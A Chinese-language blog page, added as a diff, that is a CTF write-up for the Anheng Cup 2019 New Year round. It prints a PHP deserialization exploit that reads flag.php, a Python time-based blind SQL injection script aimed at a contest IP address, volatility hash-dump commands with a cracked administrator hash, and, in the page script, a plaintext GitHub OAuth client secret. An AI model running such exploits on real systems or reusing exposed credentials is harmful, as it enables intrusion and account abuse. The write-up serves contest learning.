@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            安恒杯月赛19新年场WriteUp
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Ponyo loves Sōsuke!
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+                <li class="menu-item">
+                    <a class="menu-item-link search">
+                        Search                   
+                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
+                    </a>
+                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/01/26/安恒杯月赛19新年场WriteUp/"> 
+                    安恒杯月赛19新年场WriteUp 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-01-26   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#安恒杯月赛19新年场WriteUp"><span class="toc-list-text">安恒杯月赛19新年场WriteUp</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#Web"><span class="toc-list-text">Web</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#WEB1"><span class="toc-list-text">WEB1</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#考点"><span class="toc-list-text">考点</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#EXP"><span class="toc-list-text">EXP</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#WEB2"><span class="toc-list-text">WEB2</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#MISC"><span class="toc-list-text">MISC</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#隐写"><span class="toc-list-text">隐写</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#MISC2"><span class="toc-list-text">MISC2</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#内存取证"><span class="toc-list-text">内存取证</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#相关链接"><span class="toc-list-text">相关链接</span></a></li></ol></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#CRYPTO"><span class="toc-list-text">CRYPTO</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#键盘密码"><span class="toc-list-text">键盘密码</span></a></li></ol></li></ol>
+</div>
+            <div class="content">
+                <h1 id="安恒杯月赛19新年场WriteUp"><a href="#安恒杯月赛19新年场WriteUp" class="headerlink" title="安恒杯月赛19新年场WriteUp"></a>安恒杯月赛19新年场WriteUp</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>题目代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">@error_reporting(1); </span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">class baby </span><br><span class="line">&#123;   </span><br><span class="line">    protected $skyobj;  </span><br><span class="line">    public $aaa;</span><br><span class="line">    public $bbb;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">        $this-&gt;skyobj = new sec;</span><br><span class="line">    &#125;  </span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if (isset($this-&gt;skyobj))  </span><br><span class="line">            return $this-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">class cool </span><br><span class="line">&#123;    </span><br><span class="line">    public $filename;     </span><br><span class="line">    public $nice;</span><br><span class="line">    public $amzing; </span><br><span class="line">    function read()      </span><br><span class="line">    &#123;   </span><br><span class="line">        $this-&gt;nice = unserialize($this-&gt;amzing);</span><br><span class="line">        $this-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;        </span><br><span class="line">            if (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                return file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123; </span><br><span class="line">                return &quot;you must be joking!&quot;; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">class sec </span><br><span class="line">&#123;  </span><br><span class="line">    function read()     </span><br><span class="line">    &#123;          </span><br><span class="line">        return &quot;it&apos;s so sec~~&quot;;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;data&apos;]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[&apos;data&apos;]);</span><br><span class="line">    echo $Input_data; </span><br><span class="line">&#125; </span><br><span class="line">else </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(&quot;./index.php&quot;); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>考点一：echo可以调用toString()函数用来返回flag.php内容</p>
+<p>考点二：让$this-&gt;nice是一个非baby的类，就能绕过$str</p>
+<p>考点三：unserialize()不会执行<strong>construct，外部不可控protected变量skyobj，但是序列化时可以放到</strong>construct内部控制</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">class baby </span><br><span class="line">&#123;   </span><br><span class="line">    protected $skyobj;  </span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">    $this-&gt;skyobj = new cool;</span><br><span class="line">    $this-&gt;skyobj-&gt;amzing = serialize(new sec);</span><br><span class="line">    $this-&gt;skyobj-&gt;filename = &quot;flag.php&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class sec </span><br><span class="line">&#123;</span><br><span class="line">    function read()&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class cool </span><br><span class="line">&#123; </span><br><span class="line">    public $filename;     </span><br><span class="line">    public $nice;</span><br><span class="line">    public $amzing; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$test = new baby();</span><br><span class="line">echo urlencode(serialize($test));</span><br></pre></td></tr></table></figure>
+
+<h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p>约束攻击登陆admin</p>
+<p>登陆后盲注</p>
+<p>EXP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def login(payload):</span><br><span class="line">    url = &quot;http://106.12.21.77/Admin/User/Index?search[table]=flag/**/where/**/1/**/and/**/%s&quot; % (payload)</span><br><span class="line">    # print &quot;[+] %s&quot; % (url)</span><br><span class="line">    before_time = time.time()</span><br><span class="line">    cookies = &#123;&apos;PHPSESSID&apos;: &apos;3kus5jrhoqav8te0kf74hglii7&apos;&#125;</span><br><span class="line">    response = requests.get(url, cookies=cookies)</span><br><span class="line">    # content = response.content</span><br><span class="line">    after_time = time.time()</span><br><span class="line">    offset = after_time - before_time</span><br><span class="line">    # print &quot;[*] Offset : %f&quot; % (offset)</span><br><span class="line">    if offset &gt; 2.5:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    data = &quot;&quot;</span><br><span class="line">    charaters = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">    for i in range(1, 40, 1):</span><br><span class="line">        for j in charaters:</span><br><span class="line">            payload = &quot;if((mid((select/**/flag/**/from/**/flag),%d,1))=&apos;%s&apos;,sleep(3),0)%%23&quot; % (i, j)</span><br><span class="line">            if login(payload):</span><br><span class="line">                data += str(j)</span><br><span class="line">                print &quot;[+] Found : %s&quot; % (data)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e zhu.jpg</span><br></pre></td></tr></table></figure>
+
+<p>Stegsolve</p>
+<h2 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h2><h3 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h3><p>volatility一把梭</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">volatility imageinfo -f memory #分析操作系统</span><br><span class="line">volatility hashdump -f memory --profile=WinXPSP2x86 #查看当前操作系统中的 password hash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/01/26/5c4c0c216b399.jpg" alt></p>
+<p>得到管理员hash如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:0182bd0bd4444bf867cd839bf040d93b:c22b315c040ae6e0efee3518d830362b:::</span><br></pre></td></tr></table></figure>
+
+<p>所以<code>c22b315c040ae6e0efee3518d830362b</code>即为管理员密码的md5值，解出来是123456789，再md5一下就行。</p>
+<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>内存取证工具 volatility 使用说明：<a href="https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/" target="_blank" rel="noopener">https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/</a></p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="键盘密码"><a href="#键盘密码" class="headerlink" title="键盘密码"></a>键盘密码</h2><p>ypau -&gt; flag</p>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Sōsuke</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2019/01/26/安恒杯月赛19新年场WriteUp/">https://hpdoger.cn/2019/01/26/安恒杯月赛19新年场WriteUp/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+    <div class="prev">
+   <a href="/2019/01/30/FireShellCTF2019 Bad Injections解题记录/">  FireShellCTF2019 Bad Injections解题记录</a>
+    </div>
+
+<div></div>
+
+    <div class="next">
+    <a href="/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/"> ThinkPHP5.0.0~5.0.23RCE漏洞分析 </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Sat Jan 26 2019 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
